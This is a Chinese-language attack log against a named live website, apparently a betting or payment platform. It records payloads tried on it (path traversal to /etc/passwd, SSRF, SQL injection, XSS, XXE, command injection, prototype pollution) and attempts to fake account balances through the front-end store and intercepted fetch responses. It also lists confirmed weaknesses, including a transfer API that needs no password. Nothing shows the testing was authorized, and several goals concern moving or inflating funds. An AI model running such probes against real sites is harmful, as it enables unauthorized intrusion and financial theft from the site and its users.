# 攻击向量测试记录 — 982827.com

## 测试日期: 2026-08-15
## 目标: f5phwmack3a.982827.com (Vue3 + Pinia + jQuery 1.10.2 + nginx)

---

## 已测试攻击向量 (全部失败)

### 1. 目录遍历
```
/api/../etc/passwd → 404
/api/..%2f..%2fetc%2fpasswd → 400 Bad Request
/m/../etc/passwd → 404
/m/static/../../../etc/passwd → 404
```
**结论**: nginx拦截了路径遍历

### 2. SSRF
```
/api/Web/GetAllBasicWebsiteConfigurationNew?url=http://127.0.0.1 → 返回配置数据,无内部访问
/api/Web/GetNotice?url=http://127.0.0.1 → 返回配置数据
/api/User/GetVipUrl?url=http://127.0.0.1 → 返回配置数据
```
**结论**: url参数被忽略,返回的是正常配置数据

### 3. HTTP头注入
```
X-Forwarded-For: 127.0.0.1 → 未反射
X-Real-IP: 127.0.0.1 → 未反射
X-Original-URL: /admin → 未反射
X-Rewrite-URL: /admin → 未反射
```
**结论**: 头部未被反射或处理

### 4. 方法覆盖
```
X-HTTP-Method-Override: DELETE → 无效
```
**结论**: 方法覆盖未实现

### 5. 参数污染
```
/api/User/GetUserInfo?id=1&id=2&id=3 → 仅处理第一个
```
**结论**: 仅处理第一个参数

### 6. SQL注入(头部)
```
Token: {'USER_SESSION_KEY':{'key':'test','value':'test' OR '1'='1'},...} → 无效
```
**结论**: Token头部SQL注入无效

### 7. XSS(输入字段)
```
<script>alert(1)</script> → API返回404
"><img src=x onerror=alert(1)> → API返回404
javascript:alert(1) → API返回404
{{7*7}} → API返回404
${7*7} → API返回404
<%= 7*7 %> → API返回404
```
**结论**: ModifyMemberInformation API不存在

### 8. XXE
```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
→ API返回404
```
**结论**: XML解析未实现或API不存在

### 9. SSTI
```
{{7*7}} → API返回404
${7*7} → API返回404
<%= 7*7 %> → API返回404
#{7*7} → API返回404
```
**结论**: 模板注入无效

### 10. 命令注入
```
; ls -la → API返回404
| ls -la → API返回404
$(ls -la) → API返回404
`ls -la` → API返回404
```
**结论**: 命令注入无效

### 11. 路径遍历(文件上传)
```
POST /api/User/UploadAvatar
filename: ../../../etc/passwd
→ API返回404
```
**结论**: 文件上传API不存在

### 12. jQuery原型污染
```javascript
var malicious = JSON.parse('{"__proto__":{"isAdmin":true,"balance":999999}}');
Object.assign({}, malicious);
var test = {};
// test.isAdmin 仍为 undefined
```
**结论**: 原型污染未生效,jQuery版本可能已修补或extend未被调用

### 13. 前端Store修改
```javascript
var globalStore = pinia._s.get('globalStore');
globalStore.yebAccBal = 1;  // 成功修改
// 但发起转账时服务端返回"余额不足"
```
**结论**: 仅修改前端显示,服务端独立验证余额

### 14. 响应拦截修改
```javascript
window.fetch = function() {
  // 拦截GetAccount响应,修改ACC_BAL:0为ACC_BAL:1
  // 但服务端仍返回余额不足
};
```
**结论**: 无法绕过服务端验证

---

## 有效攻击向量 (已确认)

### 1. 未认证API信息泄露
- 20+个API无需认证即可访问
- 泄露: 客服URL、邮箱、下载链接、安全问题列表、代理配置

### 2. 消息系统IDOR(读取)
- /api/User/GetMessageList 无需认证返回所有系统消息
- /api/User/GetNoReadMessageCount 无需认证返回未读数

### 3. 转账API无密码保护
- /api/User/TransferOperate 使用FormData格式
- 参数: transfer_amt, OUT_INT_IDENT_CD, IN_INT_IDENT_CD
- 不需要提现密码即可发起转账
- 仅受余额限制

### 4. API响应加密可逆
- 算法: 反转字符串 + Base64解码
- 所有API响应可被任何人解密

### 5. jQuery原型污染 CVE-2019-11358
- jQuery 1.10.2,理论上可污染Object.prototype
- 配合无CSP可升级为XSS → Token窃取
- 但实际测试中污染未生效

---

## 结论

该站点后端安全防护较为完善:
- SQL注入防护有效
- IDOR不存在(参数被忽略)
- 服务端余额验证独立且严格
- 新账号无法通过API增加余额
- 需要真实充值才能测试竞态条件

主要风险在于前端漏洞(XSS)和信息泄露,但无法直接导致资金损失。
